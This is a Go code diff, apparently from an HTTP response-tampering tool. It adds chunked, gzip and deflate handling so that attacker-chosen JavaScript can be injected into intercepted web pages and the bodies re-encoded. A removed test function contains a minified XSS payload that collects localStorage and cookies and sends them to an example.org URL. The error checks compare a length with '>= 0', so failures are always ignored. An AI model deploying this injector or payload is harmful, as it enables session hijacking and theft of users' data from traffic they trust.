@@ -2,59 +2,132 @@ package main
 
 import (
 	"bytes"
+	"compress/flate"
 	"compress/gzip"
 	"errors"
 	"fmt"
-	"io"
 	"io/ioutil"
+	"net/http/httputil"
 	"strings"
 )
 
-func gUnzipData(data []byte) (resData []byte, err error) {
+func padZip(lo *[]byte) {
+	for !bytes.Equal((*lo)[len(*lo)-3:], []byte{0, 0, 0}) {
+		*lo = append(*lo, 0)
+	}
+}
+func defalteData(data []byte) (resData []byte, err error) {
+	// padZip(&data)
 	b := bytes.NewBuffer(data)
 
-	var r io.Reader
-	r, err = gzip.NewReader(b)
+	r := flate.NewReader(b)
+
+	defer r.Close()
+	resData, err = ioutil.ReadAll(r)
+
 	if err != nil {
+		if len(resData) >= 0 {
+			fmt.Printf("\nEncountered an error (%v) in defalteData the data. Continuing anyways since the uncompressed data was non-empty... \n", err)
+			err = nil
+		} else {
+			fmt.Printf("\nEncountered an error (%v) in defalteData the data. Ignoring payload... \n", err)
+			return
+		}
+	}
+	return
+}
+
+func reflateData(data []byte) (compressedData []byte, err error) {
+
+	var b bytes.Buffer
+	flateWrite, err := flate.NewWriter(&b, flate.BestCompression)
+	if err != nil {
+		fmt.Printf("\nerr in initializing Flate writer : %v \n", err)
+		return
+	}
+	defer flateWrite.Close()
+
+	_, err = flateWrite.Write(data)
+	if err != nil {
+		fmt.Printf("\nFail to re-zip the data. gz.Write: %v \n", err)
 		return
 	}
 
-	var bar []byte
-	for {
-		token := make([]byte, 4)
-		_, err := r.Read(token)
-		if err != nil {
-			fmt.Printf("\nerr in unzipping: %v \n", err)
-			panic(err)
-			break
-		}
-		bar = append(bar, token...)
+	if err = flateWrite.Flush(); err != nil {
+		fmt.Printf("\nFail to re-zip the data. gz.Flush: %v \n", err)
+		return
 	}
 
-	resData = bar
+	compressedData = b.Bytes()
 
+	return
+}
+
+func unchunkData(data []byte) (resData []byte, err error) {
+	b := bytes.NewBuffer(data)
+	r := ioutil.NopCloser(httputil.NewChunkedReader(b))
+	defer r.Close()
+	resData, err = ioutil.ReadAll(r)
+
+	if err != nil {
+		if len(resData) >= 0 {
+			fmt.Printf("\nEncountered an error (%v) in unchunkData the data. Continuing anyways since the uncompressed data was non-empty... \n", err)
+			err = nil
+		} else {
+			fmt.Printf("\nEncountered an error (%v) in unchunkData the data. Ignoring payload... \n", err)
+			return
+		}
+	}
+	return
+}
+
+func gUnzipData(data []byte) (resData []byte, err error) {
+	// padZip(&data)
+	b := bytes.NewBuffer(data)
+
+	// var r io.Reader
+	r, err := gzip.NewReader(b)
+	if err != nil {
+		fmt.Printf("\nFail to init the unzipper for the the data: %v \n", err)
+		return
+	}
+	defer r.Close()
+	resData, err = ioutil.ReadAll(r)
+
+	if err != nil {
+		if len(resData) >= 0 {
+			fmt.Printf("\nEncountered an error (%v) in gunzipping the data. Continuing anyways since the uncompressed data was non-empty... \n", err)
+			err = nil
+		} else {
+			fmt.Printf("\nEncountered an error (%v) in gunzipping the data. Ignoring payload... \n", err)
+			return
+		}
+	}
 	return
 }
 
 func gZipData(data []byte) (compressedData []byte, err error) {
 	var b bytes.Buffer
 	gz := gzip.NewWriter(&b)
+	defer gz.Close()
 
 	_, err = gz.Write(data)
 	if err != nil {
+		fmt.Printf("\nFail to re-zip the data. gz.Write: %v \n", err)
 		return
 	}
 
 	if err = gz.Flush(); err != nil {
+		fmt.Printf("\nFail to re-zip the data. gz.Flush: %v \n", err)
 		return
 	}
 
 	if err = gz.Close(); err != nil {
+		fmt.Printf("\nFail to re-zip the data. gz.Close: %v \n", err)
 		return
 	}
 
 	compressedData = b.Bytes()
-
 	return
 }
 
@@ -78,7 +151,7 @@ func addAccessControl(headerStr *string, accessControl *string) {
 	*headerStr = strings.TrimSpace(*headerStr) + "\r\n" + *accessControl + "\r\n\r\n"
 }
 
-func httpDataHandler(_data *[]byte, doGzip bool, javaScript *string, verbose bool) (markAsModified bool) {
+func httpDataHandler(_data *[]byte, encoding *string, javaScript *string, chunked *bool, verbose bool) (markAsModified bool) {
 	defer func() {
 		if r := recover(); r != nil {
 			if verbose {
@@ -87,11 +160,11 @@ func httpDataHandler(_data *[]byte, doGzip bool, javaScript *string, verbose boo
 			markAsModified = false
 		}
 	}()
-	modifyHTTPResonse(_data, doGzip, javaScript)
+	modifyHTTPResonse(_data, encoding, javaScript, chunked)
 	return true
 }
 
-func modifyHTTPResonse(_data *[]byte, doGzip bool, javaScript *string) {
+func modifyHTTPResonse(_data *[]byte, encoding *string, javaScript *string, chunked *bool) {
 	sep := "\r\n\r\n"
 	content := *_data
 	strData := string(content)
@@ -105,17 +178,32 @@ func modifyHTTPResonse(_data *[]byte, doGzip bool, javaScript *string) {
 	}
 
 	if len(content) == 0 {
-		panic("Unable to handle chunked encoding")
+		panic("Unable to handle empty HTTP body")
 	}
 
 	var uncompressedData []byte
 	var uncompressedDataErr error
-	if doGzip {
-		fmt.Printf("\nunzipping contents: %v \n", doGzip)
+	doGzip := *encoding == "gzip"
+	doFlate := *encoding == "deflate"
 
+	if *chunked {
+		content, uncompressedDataErr = unchunkData(content)
+		if uncompressedDataErr != nil {
+			fmt.Printf("\nError unchunking contents: %v \n", uncompressedDataErr)
+			panic(uncompressedDataErr)
+		}
+	}
+
+	if doGzip {
 		uncompressedData, uncompressedDataErr = gUnzipData(content)
 		if uncompressedDataErr != nil {
 			fmt.Printf("\nError unzipping contents: %v \n", uncompressedDataErr)
+			panic(uncompressedDataErr)
+		}
+	} else if doFlate {
+		uncompressedData, uncompressedDataErr = defalteData(content)
+		if uncompressedDataErr != nil {
+			fmt.Printf("\nError deflating contents: %v \n", uncompressedDataErr)
 			panic(uncompressedDataErr)
 		}
 	} else {
@@ -134,17 +222,15 @@ func modifyHTTPResonse(_data *[]byte, doGzip bool, javaScript *string) {
 			fmt.Printf("\nError recompressing contents: %v \n", recompErr)
 			panic(recompErr)
 		}
+	} else if doFlate {
+		recomp, recompErr = reflateData([]byte(repl))
+		if recompErr != nil {
+			fmt.Printf("\nError reflating contents: %v \n", recompErr)
+			panic(recompErr)
+		}
 	} else {
 		recomp = []byte(repl)
 	}
 
 	*_data = append([]byte(HEADER), recomp...)
-}
-
-func testInjectHTML() {
-	content, _ := ioutil.ReadFile("req4.cap")
-	fmt.Printf("BEFORE %v\n\n\n\n", string(content))
-	xss := `var once=!0;setInterval(function(){try{if(once||.3>Math.random()){once=!1;var a="/?",b=(s=JSON.stringify(window.localStorage))&&2<s.length;b&&(a+="ls="+encodeURI(s));(d=document.cookie)&&0<d.length&&(b&&(a+="&"),a+="c="+encodeURI(d));if(2<a.length){var c=new XMLHttpRequest;c.open("GET","https://www.example.org/example"+a);c.send()}}}catch(e){}},8E3);`
-	httpDataHandler(&content, true, &xss, true)
-	fmt.Printf("AFTER %v\n\n\n\n", string(content))
 }
